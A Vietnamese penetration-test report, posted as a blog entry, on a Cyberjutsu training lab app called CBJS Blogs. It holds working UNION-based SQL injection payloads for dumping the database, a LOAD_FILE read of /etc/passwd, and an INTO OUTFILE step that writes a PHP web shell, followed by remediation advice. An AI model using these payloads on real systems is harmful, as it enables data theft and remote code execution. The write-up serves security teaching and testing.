---
layout: post
title:  "Report CBJS Blogs"
date:   2025-05-09 13:15:00 +0700
tags: Report CBJS
categories: jekyll update
---

# I. Tổng quan 
## 1. Mục tiêu
Báo cáo này nhằm liệt kê các lỗ hổng bảo mật và các vấn đề liên quan được phát hiện trong quá trình kiểm thử ứng dụng ```CBJS Blogs```
## 2. Đối tượng 
Các mục tiêu kiểm thử bao gồm: 
- ```http://blogs-chain.cyberjutsu-lab.tech:8090/```
## 3. Phạm vi 
Phạm vi kiểm thử bao gồm toàn bộ chức năng của ứng dụng CBJS Blogs, được triển khai trên đối tượng. 

Quá trình kiểm thử được thực hiện trên môi trường Cyberjutsu Academy cung cấp, không gây ảnh hưởng đến hệ thống thực tế. Phương pháp kiểm thử áp dụng là White-box. Các công cụ và kỹ thuật kiểm thử tuân thủ quy định của bài kiểm tra, đảm bảo tính hợp pháp và an toàn. Ứng dụng không được gắn với phiên bản cụ thể nào trong quá trình kiểm thử.
## 4. Quy ước đặt mã lỗ hổng
Các lỗ hổng được phát hiện trong quá trình kiểm thử sẽ được đặt theo quy ước sau:
- **CBJS-[Số thứ tự]**: Lỗ hổng trên ```http://blogs-chain.cyberjutsu-lab.tech:8090/``` (CBJS Blogs)
Số thứ tự được đánh tăng dần theo thứ tự liên quan của các lỗ hổng, dựa trên luồng khai thác thực tế. 
## 5. Bảng tổng hợp các lỗ hổng
![image](https://hackmd.io/_uploads/HkFMBFigle.png)
<p style="text-align:center;"><em>Lỗ hổng tại http://blogs-chain.cyberjutsu-lab.tech:8090/</em></p>

# II. Chi tiết các lỗ hổng bảo mật
## 1. CBJS-01: SQL Injection at ```/post.php?id=``` leads to database dumping [<span style="color:#f39c12">High</span>]
### Description and Impact 
Tại website ```http://blogs-chain.cyberjutsu-lab.tech:8090/```, web sẽ hiển thị ra các mục bao gồm ```SSRF TUTORIAL```, ```XSS TUTORIAL```, ```RECON TUTORIAL``` và khi click vào thì sẽ hiển thị nội dưng ứng với id được gán trong DB và theo URL ```http://blogs-chain.cyberjutsu-lab.tech:8090/post.php?id=1``` tương ứng. 
Vì đây là tham số nhận vào 1 untrusted data (ở đây là 1 số nguyên), nên có thể cho phép các kẻ tấn công sử dụng nhiều payload SQLi dump được database.
### Root Cause Analysis 
Lỗ hổng SQL Injection xảy ra do lập trình viên không áp dụng các biện pháp bảo vệ khi xử lý dữ liệu đầu vào từ tham số `id` trong phương thức `GET`. Câu truy vấn SQL được xây dựng bằng cách nối chuỗi trực tiếp với giá trị người dùng cung cấp, thay vì sử dụng truy vấn có tham số (prepared statements), dẫn đến việc kẻ tấn công có thể chèn mã SQL tùy ý vào truy vấn.

![image](https://hackmd.io/_uploads/rJpxojuegx.png)
<p style="text-align:center;"><em>Câu query gây lỗi SQLi</em></p>
</div>

### Step to reproduce 
Đầu tiên, mình sẽ thực hiện xem câu ```query``` gốc truy vấn trong table ```posts``` có bao nhiêu ```column``` bằng ```ORDER BY```
> ORDER BY 3 --> ko gây lỗi
> ORDER BY 4 --> ko gây lỗi
> ORDER BY 5 --> gây lỗi

Từ đây mình có thể xác định được là query 4 cột trong câu query gốc. 

![image](https://hackmd.io/_uploads/ByDge2Oeee.png)
<p style="text-align:center;"><em>ORDER BY 5 gây lỗi</em></p>

Đồng thời khi lỗi thì web lại tiết lộ Document Root là <code>/var/www/html</code>

Tiếp tục mình xác định tên DB của web 
> UNION SELECT 1,2,3,DATABASE()

![image](https://hackmd.io/_uploads/rJXV30ulle.png)
<p style="text-align:center;"><em>Xác định tên DB</em></p>

Xác định tên table trong DB 
> UNION 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='blog'

![image](https://hackmd.io/_uploads/SJmMJ1Kxxl.png)
<p style="text-align:center;"><em>Xác định tên table</em></p>

Xác định tên column trong DB 
> UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts'

![image](https://hackmd.io/_uploads/ryxRyytgge.png)
<p style="text-align:center;"><em>Xác định tên cột</em></p>

### Recommendations 
Để khắc phục lỗ hổng SQLi này thì nên có các biện pháp chặn chặt chẽ từ câu query như dùng ```Prepare Statements``` hoặc trước khi truyền data vào tham số ```id``` thì nên validate và ép kiểu thành ```int```. 

### References 
- BurpSuite 

## 2. CBJS-02: SQL Injection at ```/post.php?id=``` lead to RCE via Privilege Escalation [<span style="color:#e74c3c">Critical</span>]

### Description and Impact 
Sau khi kiểm tra quyền của user hiện tại của cơ sở dữ liệu thì phát hiện là user admin với quyền cao nhất. Từ đây kẻ tấn công có thể thực hiện nhiều hành vi đặc biệt là ghi file để có thể kiểm soát từ xa. 
### Root Cause Analysis
Lỗ hổng xảy ra do không sử dụng cơ chế truy vấn an toàn (prepared statements) trong xử lý tham số `id` trên endpoint `/post.php`, dẫn đến SQL Injection từ lỗ hổng `CBJS-01`. Ngoài ra, hệ thống còn cấp quyền quá mức cho tài khoản `admin`, bao gồm cả khả năng ghi tệp vào thư mục webroot, tạo điều kiện để kẻ tấn công thực hiện Remote Code Execution sau khi leo thang đặc quyền.
### Step to reproduce 
Từ tham số id, kiểm tra user hiện tại. 
> UNION SELECT 1,2,3,GROUP_CONCAT(user())

![image](https://hackmd.io/_uploads/Bk9Hw1Fgxg.png)
<p style="text-align:center;"><em>Xác định user hiện tại</em></p>

Kiểm tra tiếp theo là quyền của user này. 
> UNION SELECT 1,2,grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'admin'@'localhost'"

![image](https://hackmd.io/_uploads/BJUgokFxxe.png)
<p style="text-align:center;"><em>Xác định quyền user hiện tại</em></p>

Thì hầu hết các quyền cao nhất đều nằm ở user này. 

Từ đây mình có thể tác với file chẳng hạn như load 1 file lên để đọc. 
> UNION SELECT 1,2,3,LOAD_FILE('/etc/passwd')

![image](https://hackmd.io/_uploads/rJqEn1Fglx.png)
<p style="text-align:center;"><em>Đọc file /etc/passwd</em></p>

Kiểm tra xem có biến `secure_file_priv` nếu có thì chắc chắn mình ghi file được.
```
UNION SELECT 1,2,variable_name,variable_value FROM performance_schema.global_variables WHERE variable_name="secure_file_priv"
```
![image](https://hackmd.io/_uploads/HJTB6JFxeg.png)
<p style="text-align:center;"><em>Kiểm tra quyền ghi file</em></p>

Từ đây, mình ghi 1 `web shell` như sau: 
> UNION SELECT "","","",'<?php system($_REQUEST[1]); ?>' INTO OUTFILE ('/var/www/html/shell.php')

![image](https://hackmd.io/_uploads/SkFfQgKlgg.png)
<p style="text-align:center;"><em>Ghi một web shell</em></p>

Sau đó, truy cập file shell.
![image](https://hackmd.io/_uploads/HkGPQxFexe.png)
<p style="text-align:center;"><em>Truy cập file shell</em></p>
    
### Recommendations 
Sử dụng prepared statements để tránh SQL Injection thay vì nối chuỗi trong truy vấn. Không dùng tài khoản DB có quyền cao như root cho ứng dụng; thay vào đó, tạo user riêng chỉ có quyền cần thiết. Luôn validate kỹ dữ liệu đầu vào và thiết lập cơ chế log để phát hiện truy vấn bất thường
    
### References 
- BurpSuite 

# III. Kết luận
Quá trình phân tích bảo mật đã phát hiện ra lỗ hổng nghiêm trọng trong ứng dụng. Lỗ hổng này xuất phát từ việc thiếu kiểm soát đầu vào, xử lý dữ liệu không an toàn,
và không áp dụng các biện pháp xác thực/phân quyền đầy đủ. Tác động tiềm tàng bao gồm lộ dữ liệu người dùng, leo thang đặc quyền, và kiểm soát máy chủ, đe dọa nghiêm trọng đến tính bảo mật và toàn vẹn của hệ thống.
<p style="text-align: right;">Trân trọng, h4gphwc</p>



